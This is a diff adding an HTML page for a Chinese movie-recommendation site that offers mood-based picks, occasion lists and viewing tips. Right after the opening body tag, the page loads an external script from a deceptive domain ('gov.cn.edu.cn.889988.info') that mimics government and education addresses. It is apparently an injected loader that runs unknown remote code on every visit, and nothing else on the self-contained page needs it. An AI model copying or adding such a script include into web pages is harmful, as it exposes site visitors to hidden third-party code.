@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>俺也去电影网｜把"随便看部电影"变成能落地的选择</title>
+<meta name="description" content="俺也去电影网是面向普通观众的观影决策站：按情绪、场合与陪伴对象提供片单组合，附上放映时长、适合时段与观影提示，解决临时起意时不知道看什么的尴尬。">
+<meta name="keywords" content="俺也去电影网,临时看什么电影,周末片单推荐,陪家人看什么片,情绪选片,小成本观影">
+<link rel="canonical" href="https://anyequdianyingwang-zh.github.io/">
+<style>
+:root{
+  --ink:#16181a;
+  --ink2:#2b2e33;
+  --paper:#f6f3ec;
+  --paper2:#efebe2;
+  --card:#fffdf8;
+  --red:#c8321e;
+  --red2:#e8553f;
+  --blue:#1f4e6b;
+  --blue2:#2f7ba6;
+  --line:#1a1c1f;
+  --mute:#6b6f76;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Kaiti SC","STKaiti","KaiTi","Songti SC",Georgia,"PingFang SC",serif;
+  background:var(--paper);color:var(--ink);line-height:1.9;
+  background-image:
+    linear-gradient(var(--paper2) 1px,transparent 1px),
+    linear-gradient(90deg,var(--paper2) 1px,transparent 1px);
+  background-size:26px 26px;
+}
+body:before{
+  content:"";position:fixed;inset:0;pointer-events:none;z-index:200;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(22,24,26,.022) 2px,rgba(22,24,26,.022) 3px);
+}
+::selection{background:var(--red);color:#fff}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 32px}
+
+/* TOP BAR */
+.topbar{background:var(--ink);color:var(--paper);padding:11px 0;font-size:12.5px;position:relative;z-index:5}
+.topbar .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.topbar a{color:#c9ccd1}
+.topbar a:hover{color:var(--red2)}
+.topbar .url{font-family:"SFMono-Regular",monospace;color:#9ea3aa}
+.topbar .url b{color:var(--red2);font-weight:400}
+
+/* MASTHEAD */
+.masthead{border-bottom:3px double var(--line);padding:30px 0 24px;position:relative;z-index:5}
+.mh-top{display:flex;justify-content:space-between;align-items:flex-end;flex-wrap:wrap;gap:18px}
+.mh-left{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap}
+.date{font-family:Georgia,serif;font-size:13px;color:var(--mute);letter-spacing:1px;border-left:2px solid var(--red);padding-left:12px}
+.kicker{font-family:"PingFang SC","Microsoft YaHei",sans-serif;font-size:11px;letter-spacing:4px;color:var(--red);text-transform:uppercase}
+h1.site{font-size:58px;font-weight:900;letter-spacing:2px;line-height:1.05;margin-top:16px;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+h1.site span{color:var(--red)}
+h1.site small{display:block;font-size:16px;font-weight:400;color:var(--mute);letter-spacing:0;margin-top:12px;line-height:1.8;max-width:760px;font-family:"Songti SC",Georgia,serif}
+.mh-right{text-align:right;font-family:"PingFang SC",sans-serif;font-size:13px;color:var(--mute);line-height:2}
+.mh-right b{display:block;color:var(--ink);font-size:15px;font-weight:700}
+
+/* NAV */
+nav.secnav{border-bottom:1px solid var(--line);padding:0;margin-top:22px;position:relative;z-index:5}
+nav.secnav ul{display:flex;flex-wrap:wrap;gap:2px}
+nav.secnav a{font-family:"PingFang SC",sans-serif;font-size:14.5px;font-weight:700;letter-spacing:1px;padding:14px 20px;color:var(--ink2);border-bottom:3px solid transparent;transition:.15s}
+nav.secnav a:hover{border-bottom-color:var(--red);color:var(--red)}
+nav.secnav a.act{border-bottom-color:var(--red);color:var(--red);background:var(--card)}
+
+/* LEAD */
+.lead{padding:44px 0 34px;position:relative;z-index:5}
+.lead-grid{display:grid;grid-template-columns:1.55fr 1fr;gap:52px;align-items:start}
+.lede{font-size:22px;line-height:2.05;color:var(--ink);font-family:"Songti SC",Georgia,serif}
+.lede:first-letter{font-size:56px;float:left;line-height:.95;padding:6px 12px 0 0;color:var(--red);font-weight:900}
+.drop{background:var(--card);border:1px solid var(--line);border-left:5px solid var(--red);padding:26px 28px;font-family:"PingFang SC",sans-serif;font-size:14px;color:var(--ink2);line-height:2}
+.drop b{display:block;font-size:12px;letter-spacing:3px;color:var(--red);margin-bottom:12px;font-family:Arial,sans-serif}
+.drop p+p{margin-top:14px}
+.drop p i{font-style:normal;color:var(--red);font-weight:700}
+
+/* SECTION */
+section{padding:64px 0;border-top:1px solid rgba(26,28,31,.14);position:relative;z-index:5}
+section:first-of-type{border-top:0}
+.sh{display:flex;gap:20px;align-items:baseline;margin-bottom:40px;flex-wrap:wrap}
+.sh .no{font-family:Georgia,serif;font-size:44px;font-weight:900;color:var(--red);line-height:1;opacity:.85}
+.sh h2{font-size:27px;font-weight:900;letter-spacing:1px;font-family:"PingFang SC",sans-serif;border-left:4px solid var(--red);padding-left:16px}
+.sh h2 em{font-style:normal;color:var(--mute);font-weight:400;font-size:14px;display:block;letter-spacing:0;margin-top:6px;font-family:"Songti SC",Georgia,serif}
+
+/* MOOD TABLE */
+table.mood{width:100%;border-collapse:collapse;background:var(--card);font-family:"PingFang SC",sans-serif;font-size:14.5px}
+table.mood th,table.mood td{border:1px solid rgba(26,28,31,.18);padding:16px 18px;vertical-align:top;text-align:left}
+table.mood thead th{background:var(--ink);color:var(--paper);font-weight:700;font-size:13.5px;letter-spacing:1px}
+table.mood thead th.m{width:20%;color:var(--red2)}
+table.mood tbody tr:nth-child(even){background:var(--paper2)}
+table.mood td.mood-name{font-weight:900;font-size:16px;color:var(--ink);white-space:nowrap}
+table.mood td.mood-name span{display:block;font-size:11px;color:var(--mute);font-weight:400;letter-spacing:1px;margin-top:4px;font-family:Arial,sans-serif}
+table.mood td b{color:var(--blue);font-weight:700}
+table.mood tr:hover{background:#fff4ee}
+
+/* PICKS */
+.picks{display:grid;grid-template-columns:repeat(3,1fr);gap:24px}
+.pick{border:1px solid var(--line);background:var(--card);padding:0 0 26px;transition:.2s;position:relative}
+.pick:hover{transform:translateY(-4px);box-shadow:0 14px 34px -18px rgba(22,24,26,.45);border-color:var(--red)}
+.pick .ribbon{background:var(--ink);color:var(--paper);font-family:"PingFang SC",sans-serif;font-size:12px;letter-spacing:2px;padding:9px 16px;display:flex;justify-content:space-between}
+.pick .ribbon i{font-style:normal;color:var(--red2);font-family:Arial,sans-serif}
+.pick h3{font-size:20px;font-weight:900;padding:20px 24px 8px;font-family:"PingFang SC",sans-serif}
+.pick p{font-size:14px;color:var(--mute);padding:0 24px;line-height:1.9}
+.pick dl{padding:18px 24px 0;display:grid;grid-template-columns:auto 1fr;gap:7px 14px;font-family:"PingFang SC",sans-serif;font-size:13px;border-top:1px dashed rgba(26,28,31,.18);margin-top:18px}
+.pick dt{color:var(--red);font-weight:700}
+.pick dd{color:var(--ink2)}
+
+/* DOSSIER */
+.dos{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border-top:1px solid var(--line);border-left:1px solid var(--line)}
+.dos>div{padding:30px 26px;border-right:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--card)}
+.dos .nm{font-family:Arial,sans-serif;font-size:11px;letter-spacing:2px;color:var(--red);margin-bottom:12px}
+.dos h4{font-size:17px;font-weight:900;margin-bottom:12px;font-family:"PingFang SC",sans-serif}
+.dos p{font-size:13.5px;color:var(--mute);line-height:1.85}
+
+/* TWO COL */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line)}
+.two>div{padding:38px 34px;background:var(--card)}
+.two>div:first-child{border-right:1px solid var(--line);background:var(--paper2)}
+.two h3{font-size:19px;font-weight:900;margin-bottom:22px;font-family:"PingFang SC",sans-serif}
+.two h3:before{content:"§";color:var(--red);margin-right:10px;font-family:Georgia,serif}
+.two ol,.two ul{font-family:"PingFang SC",sans-serif;font-size:14px;color:var(--ink2)}
+.two ol li{padding:14px 0 14px 38px;border-bottom:1px solid rgba(26,28,31,.12);position:relative;line-height:1.85}
+.two ol li:last-child{border-bottom:0}
+.two ol li i{position:absolute;left:0;top:13px;font-style:normal;font-family:Arial,sans-serif;font-size:12px;color:var(--red);font-weight:700;width:26px}
+.two ol li b{color:var(--ink);font-weight:700;display:block;margin-bottom:2px}
+.two ul li{padding:11px 0 11px 20px;position:relative;border-bottom:1px solid rgba(26,28,31,.1)}
+.two ul li:last-child{border-bottom:0}
+.two ul li:before{content:"—";position:absolute;left:0;color:var(--red);font-weight:700}
+.two ul li b{color:var(--blue);font-weight:700}
+
+/* QUOTES */
+.qs{display:grid;grid-template-columns:repeat(2,1fr);gap:26px}
+.q{background:var(--card);border:1px solid var(--line);padding:30px 32px;border-bottom:4px solid var(--red);font-family:"Songti SC",Georgia,serif}
+.q cite{display:block;font-style:normal;font-size:13px;color:var(--red);font-weight:700;margin-bottom:12px;font-family:"PingFang SC",sans-serif;letter-spacing:1px}
+.q p{font-size:15.5px;line-height:2;color:var(--ink2)}
+.q p:before{content:"“";font-size:34px;color:var(--red);line-height:0;vertical-align:-12px;margin-right:4px;font-family:Georgia,serif}
+
+/* COLOPHON */
+.col{border:2px solid var(--ink);background:var(--paper2);padding:44px 48px}
+.co-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:30px}
+.co-grid div b{display:block;font-size:13px;font-weight:700;color:var(--ink);margin-bottom:7px;font-family:"PingFang SC",sans-serif;letter-spacing:1px}
+.co-grid div span{font-size:13px;color:var(--mute);line-height:1.9;display:block;font-family:"PingFang SC",sans-serif}
+.co-grid div span u{text-decoration:none;color:var(--blue);font-family:"SFMono-Regular",monospace;font-size:12.5px}
+
+/* FOOTER */
+footer{border-top:3px double var(--line);background:var(--ink);color:var(--paper);padding:52px 0 30px;position:relative;z-index:5}
+.ft{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:44px}
+.ft .brand{font-size:24px;font-weight:900;font-family:"PingFang SC",sans-serif}
+.ft .brand span{color:var(--red2)}
+.ft .brand+p{font-size:13.5px;color:#a7acb3;margin-top:14px;max-width:380px;font-family:"PingFang SC",sans-serif;line-height:1.95}
+.ft h5{font-size:12px;letter-spacing:3px;color:var(--red2);margin-bottom:18px;font-family:Arial,sans-serif}
+.ft ul{font-family:"PingFang SC",sans-serif;font-size:13.5px;display:flex;flex-direction:column;gap:11px}
+.ft a{color:#c9ccd1}
+.ft a:hover{color:var(--red2)}
+.fbot{margin-top:44px;padding-top:24px;border-top:1px solid rgba(255,255,255,.14);display:flex;justify-content:space-between;flex-wrap:wrap;gap:18px;font-size:12.5px;color:#8d9299;font-family:"PingFang SC",sans-serif}
+.fbot u{text-decoration:none;color:var(--red2);font-family:"SFMono-Regular",monospace}
+
+/* RESPONSIVE */
+@media (max-width:1000px){
+  .lead-grid{grid-template-columns:1fr;gap:34px}
+  .picks{grid-template-columns:repeat(2,1fr)}
+  .dos,.co-grid{grid-template-columns:repeat(2,1fr)}
+  .ft{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 18px}
+  h1.site{font-size:34px}
+  h1.site small{font-size:14.5px}
+  .mh-right{text-align:left}
+  .lede{font-size:18px}
+  nav.secnav a{padding:12px 13px;font-size:13.5px}
+  section{padding:46px 0}
+  .sh{margin-bottom:26px}
+  .sh h2{font-size:21px}
+  .sh .no{font-size:32px}
+  table.mood{font-size:13px}
+  table.mood th,table.mood td{padding:11px 10px}
+  table.mood td.mood-name{white-space:normal}
+  .picks,.qs,.two,.dos,.co-grid{grid-template-columns:1fr}
+  .dos>div{border-right:0}
+  .two>div:first-child{border-right:0;border-bottom:1px solid var(--line)}
+  .col{padding:30px 24px}
+  .ft{grid-template-columns:1fr}
+  .q,.pick{padding:24px}
+  .pick dl{grid-template-columns:1fr;gap:3px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>一个给普通观众的观影决策站，不评分、不打榜</span>
+    <span class="url">访问入口 <b>https://anyequdianyingwang-zh.github.io</b></span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div class="mh-top">
+      <div class="mh-left">
+        <span class="date">星期六 · 丙午年八月廿四 · 观影专号</span>
+        <span class="kicker">Watch Together</span>
+      </div>
+      <div class="mh-right">
+        <b>读者服务</b>
+        临时起意不知道看什么 → 按情绪找 → 看一场再回来
+      </div>
+    </div>
+    <h1 class="site">俺也去<span>电影网</span><small>把"随便看部电影"这句话变成能落地的选择。这里不告诉你哪部最好，只帮你在当下的心情、时间和同伴条件下，找到那一两部刚好对得上的片。</small></h1>
+    <nav class="secnav">
+      <ul>
+        <li><a href="#mood" class="act">按情绪选</a></li>
+        <li><a href="#picks">今日四组片单</a></li>
+        <li><a href="#dossier">场合备忘</a></li>
+        <li><a href="#rules">选择方法</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<!-- LEAD -->
+<div class="wrap">
+  <div class="lead">
+    <div class="lead-grid">
+      <p class="lede">每个人都有过这种时刻：人齐了，沙发空着，遥控器在手里转了三圈，还是那句"随便，俺也去"。问题从来不是没片看，而是选择太多、时间太碎、口味又不一致。本站做三件事——先问你今天是什么状态，再给几组组合，最后告诉你什么时候看最舒服。选完就去看，别再翻半小时。</p>
+      <div class="drop">
+        <b>本站使用说明 / HOW TO USE</b>
+        <p><i>第一步</i>　承认自己不知道想看什么，这不算失败。</p>
+        <p><i>第二步</i>　在"按情绪选"里挑最近的一条，不必全中。</p>
+        <p><i>第三步</i>　按放映时长判断是否放得下，宁可留十分钟余量。</p>
+        <p><i>第四步</i>　看完回来，把翻车的一次告诉别人。</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MOOD -->
+<section id="mood">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">01</span>
+      <h2>按情绪选<em>先说清你今天是什么状态，片单自然就窄了</em></h2>
+    </div>
+    <table class="mood">
+      <thead>
+        <tr>
+          <th class="m">当下状态</th>
+          <th>合适的片子长什么样</th>
+          <th>建议时长</th>
+          <th>看完大概的感受</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mood-name">累到不想动<span>TIRED</span></td>
+          <td>节奏不快、冲突不密、不需要记人物关系的，最好是<b>已经看过一次</b>的，省掉猜剧情的心力</td>
+          <td>90 分钟以内</td>
+          <td>松一口气，不留下待办事项</td>
+        </tr>
+        <tr>
+          <td class="mood-name">想笑一场<span>LOW</span></td>
+          <td>群像喜剧、生活流，避免谐音梗密集和需要文化背景太多的</td>
+          <td>100 分钟上下</td>
+          <td>松弛，话题能接着往下聊</td>
+        </tr>
+        <tr>
+          <td class="mood-name">想认真看一次<span>FOCUS</span></td>
+          <td>结构完整、信息量大，最好留出一整段无人打扰的时间</td>
+          <td>130 分钟以上</td>
+          <td>充实，值得讨论</td>
+        </tr>
+        <tr>
+          <td class="mood-name">陪长辈一起<span>FAMILY</span></td>
+          <td>叙事清楚、节奏直白、没有大段静默和复杂时间线</td>
+          <td>110 分钟左右</td>
+          <td>大家都能跟上，不至于各看各的</td>
+        </tr>
+        <tr>
+          <td class="mood-name">刚吵完架<span>RESTLESS</span></td>
+          <td>别看沉重的，也别看甜到发腻的，挑个<b>中性</b>的、关于手艺或自然的</td>
+          <td>不限</td>
+          <td>先把情绪平下去</td>
+        </tr>
+        <tr>
+          <td class="mood-name">睡不着<span>LATE</span></td>
+          <td>熟悉的老片、旅行与自然类，亮度低一些更好</td>
+          <td>60–90 分钟</td>
+          <td>脑子不再转</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- PICKS -->
+<section id="picks">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">02</span>
+      <h2>今日四组片单<em>不是排行榜，是四种常见场合的现成答案</em></h2>
+    </div>
+    <div class="picks">
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 A</span><i>两人 · 晚上</i></div>
+        <h3>周末窝沙发</h3>
+        <p>时间宽裕、可以暂停、聊两句也没关系。适合选那种看完会想再讨论一阵子的。</p>
+        <dl>
+          <dt>时长</dt><dd>约 120 分钟</dd>
+          <dt>节奏</dt><dd>中等偏慢，允许走神</dd>
+          <dt>门槛</dt><dd>无需前作，零门槛</dd>
+          <dt>提示</dt><dd>准备点零食，别卡在吃饭前开</dd>
+        </dl>
+      </article>
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 B</span><i>三人以上</i></div>
+        <h3>全家凑一块</h3>
+        <p>口味分散是常态。挑叙事直白、对话清楚、没有需要提前补课的背景设定的。</p>
+        <dl>
+          <dt>时长</dt><dd>约 105 分钟</dd>
+          <dt>节奏</dt><dd>明快，二十分钟一个转折</dd>
+          <dt>门槛</dt><dd>老人小孩都能跟上</dd>
+          <dt>提示</dt><dd>先看三分钟片段再定，别现场表决</dd>
+        </dl>
+      </article>
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 C</span><i>一个人</i></div>
+        <h3>给自己留两小时</h3>
+        <p>这是唯一允许"挑难的"的场合。平时想看没看的、需要集中注意力的，都放这里。</p>
+        <dl>
+          <dt>时长</dt><dd>135 分钟左右</dd>
+          <dt>节奏</dt><dd>前期慢，后半段发力</dd>
+          <dt>门槛</dt><dd>需要一点耐心</dd>
+          <dt>提示</dt><dd>手机静音，关掉弹幕</dd>
+        </dl>
+      </article>
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 D</span><i>碎片时间</i></div>
+        <h3>只有四十分钟</h3>
+        <p>别硬开长片，拆两次看会破坏节奏。纪录片单集和短片合集反而更合适。</p>
+        <dl>
+          <dt>时长</dt><dd>30–45 分钟</dd>
+          <dt>节奏</dt><dd>自成一集，可随时停</dd>
+          <dt>门槛</dt><dd>无需前后衔接</dd>
+          <dt>提示</dt><dd>先列三集，别每次都重新选</dd>
+        </dl>
+      </article>
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 E</span><i>饭桌旁</i></div>
+        <h3>边吃边看</h3>
+        <p>需要看字幕的、需要盯细节的，都不适合。声音能传达主要信息，才是这一档的及格线。</p>
+        <dl>
+          <dt>时长</dt><dd>约 90 分钟</dd>
+          <dt>节奏</dt><dd>轻松，允许错过几句</dd>
+          <dt>门槛</dt><dd>声音驱动优先</dd>
+          <dt>提示</dt><dd>音量别超过聊天声</dd>
+        </dl>
+      </article>
+
+      <article class="pick">
+        <div class="ribbon"><span>场合 F</span><i>陪孩子</i></div>
+        <h3>亲子时段</h3>
+        <p>孩子真正在意的不是剧情复杂度，而是有没有能记住的画面和角色。别替他们挑"有教育意义"的。</p>
+        <dl>
+          <dt>时长</dt><dd>80–95 分钟</dd>
+          <dt>节奏</dt><dd>十分钟一个新鲜点</dd>
+          <dt>门槛</dt><dd>无文字障碍</dd>
+          <dt>提示</dt><dd>看完问一句"最喜欢谁"，比讲道理有用</dd>
+        </dl>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- DOSSIER -->
+<section id="dossier">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">03</span>
+      <h2>场合备忘<em>八个容易被忽略、但会直接决定体验的细节</em></h2>
+    </div>
+    <div class="dos">
+      <div><div class="nm">NOTE 01</div><h4>别在吃饭前五分钟开片</h4><p>卡在半路最难受。开片前先确认这一场能不能放完整，剩下的留给片尾，别急着退。</p></div>
+      <div><div class="nm">NOTE 02</div><h4>三人以上先定题材</h4><p>让每个人说一个不要的类型，通常比让每个人说一个想要的更快收敛，争议也少。</p></div>
+      <div><div class="nm">NOTE 03</div><h4>老片不等于无聊</h4><p>画质老一些，但叙事往往更干净。第一次看的老片，效果不输新片。</p></div>
+      <div><div class="nm">NOTE 04</div><h4>看第二遍是另一种享受</h4><p>熟片省心，也省掉了"猜接下来怎么走"的消耗，累的时候值得重看。</p></div>
+      <div><div class="nm">NOTE 05</div><h4>音量比画质更要紧</h4><p>人声清楚、低频不轰头，观感提升比换设备明显。看之前先放一段试试。</p></div>
+      <div><div class="nm">NOTE 06</div><h4>留白比填满好</h4><p>一天看三部，往往一部都记不住。一场一场来，看完有空聊聊。</p></div>
+      <div><div class="nm">NOTE 07</div><h4>别被评分绑住</h4><p>评分是别人的状态，不是你的。适合当下的，就是好选择。</p></div>
+      <div><div class="nm">NOTE 08</div><h4>记下翻车的那次</h4><p>踩过的坑是最有用的片单。下次直接避开同类的，比再看十份榜单都快。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- RULES -->
+<section id="rules">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">04</span>
+      <h2>选择方法<em>本站判断一部片"现在能不能看"的依据</em></h2>
+    </div>
+    <div class="two">
+      <div>
+        <h3>四条基本规则</h3>
+        <ol>
+          <li><i>01</i><div><b>先看时长，再看口碑</b><p>时间是硬约束，口碑是软的。九十分钟放不下的长片，再好也只能改天。</p></div></li>
+          <li><i>02</i><div><b>同伴决定上限</b><p>有小孩和长辈在场时，再好的复杂叙事也要让位，这不是将就，是尊重场合。</p></div></li>
+          <li><i>03</i><div><b>情绪不对就换</b><p>开片二十分钟还进不去，别硬撑。换个类型不是失败，是及时止损。</p></div></li>
+          <li><i>04</i><div><b>熟悉度是资源</b><p>状态差的时候，老片的价值高于新片。把新片留给状态好的时候。</p></div></li>
+        </ol>
+      </div>
+      <div>
+        <h3>常见误区</h3>
+        <ul>
+          <li><b>把"高分"当成"适合现在"</b><p>两者经常不重合，尤其在你很累的时候。</p></li>
+          <li><b>现场让所有人一起选</b><p>人数超过三个，表决只会变成僵持，不如提前定好两三个备选。</p></li>
+          <li><b>用手机刷半小时再决定</b><p>筛选过程本身比看片更耗神，提前列好名单能省下这半小时。</p></li>
+          <li><b>只看片名和封面</b><p>类型、时长、是否需要前作，这三个信息比简介更实用。</p></li>
+          <li><b>把观影当成任务</b><p>看不下去就停，没有哪部片值得你熬着看完。</p></li>
+          <li><b>一次开太多备选</b><p>三个就够。备选越多，最终反而越难决定。</p></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- QUOTES -->
+<section id="faq">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">05</span>
+      <h2>读者来信<em>来自真实观众的反馈，未做修饰</em></h2>
+    </div>
+    <div class="qs">
+      <blockquote class="q"><cite>读者 · 老陈 / 济南</cite><p>以前每次都是我拍板，现在改成先问一句"今天想松还是想动"，全家反而不吵了。</p></blockquote>
+      <blockquote class="q"><cite>读者 · 小满 / 成都</cite><p>按情绪那张表挺实用，我直接抄下来贴在电视柜上，省得每次都从头翻。</p></blockquote>
+      <blockquote class="q"><cite>读者 · 阿宽 / 沈阳</cite><p>最有用的其实是"场合备忘"，特别是别在吃饭前五分钟开片那条，踩过一次就记住了。</p></blockquote>
+      <blockquote class="q"><cite>读者 · 林姐 / 广州</cite><p>不再追着榜单跑了。现在就看状态挑，看完不评价好坏，轻松很多。</p></blockquote>
+    </div>
+  </div>
+</section>
+
+<!-- COLOPHON -->
+<section id="about">
+  <div class="wrap">
+    <div class="sh">
+      <span class="no">06</span>
+      <h2>站点资料<em>关于本站的基本信息</em></h2>
+    </div>
+    <div class="col">
+      <div class="co-grid">
+        <div><b>网站名称</b><span>俺也去电影网</span></div>
+        <div><b>网站网址</b><span><u>https://anyequdianyingwang-zh.github.io</u></span></div>
+        <div><b>内容定位</b><span>面向普通观众的观影决策辅助</span></div>
+        <div><b>核心栏目</b><span>按情绪选 / 今日片单 / 场合备忘 / 选择方法</span></div>
+        <div><b>内容原则</b><span>不评分、不打榜、不给唯一答案</span></div>
+        <div><b>片单性质</b><span>按场合与状态分组，非排行榜</span></div>
+        <div><b>更新节奏</b><span>随季节与档期调整</span></div>
+        <div><b>本站说明</b><span>仅提供观影选择参考，不涉及在线播放与资源下载</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <div class="brand">俺也去<span>电影网</span></div>
+        <p>一个不给唯一答案的观影决策站。今天想看什么不重要，能坐下来看完才重要。</p>
+      </div>
+      <div>
+        <h5>栏目</h5>
+        <ul>
+          <li><a href="#mood">按情绪选</a></li>
+          <li><a href="#picks">今日四组片单</a></li>
+          <li><a href="#dossier">场合备忘</a></li>
+          <li><a href="#rules">选择方法</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>场合</h5>
+        <ul>
+          <li><a href="#">窝沙发</a></li>
+          <li><a href="#">全家一起</a></li>
+          <li><a href="#">一个人看</a></li>
+          <li><a href="#">陪孩子</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>关于</h5>
+        <ul>
+          <li><a href="#about">站点资料</a></li>
+          <li><a href="#">投稿与建议</a></li>
+          <li><a href="#">转载说明</a></li>
+          <li><a href="#">联系方式</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="fbot">
+      <span>© 2026 俺也去电影网 · 网站网址 <u>https://anyequdianyingwang-zh.github.io</u> · 本站为观影选择参考类内容站点，不提供影片在线播放与资源下载服务。</span>
+      <span>观影决策 · 情绪选片 · 场合片单 · 周末观影</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var links=document.querySelectorAll('nav.secnav a');
+  for(var i=0;i<links.length;i++){
+    (function(a){
+      a.addEventListener('click',function(){
+        for(var j=0;j<links.length;j++){links[j].classList.remove('act');}
+        a.classList.add('act');
+      });
+    })(links[i]);
+  }
+})();
+</script>
+</body>
+</html>
